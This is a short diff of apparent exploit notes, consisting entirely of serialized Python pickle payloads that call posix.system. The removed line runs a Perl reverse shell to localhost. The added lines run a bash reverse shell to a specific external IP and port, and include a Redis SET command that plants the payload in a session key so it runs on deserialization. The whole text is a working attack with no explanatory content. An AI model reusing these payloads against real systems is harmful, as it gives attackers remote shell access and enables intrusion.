@@ -1,1 +1,4 @@
-b'\x80\x03cposix\nsystem\nq\x00X\xdb\x00\x00\x00perl -e \'use Socket;$i="127.0.0.1";$p=10163;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'q\x01\x85q\x02Rq\x03.'
+b"\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."
+
+(local dbg)SET "session:1de76862-b3f7-423b-8aa2-1b1da7be8a80" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."
+(remote dbg)
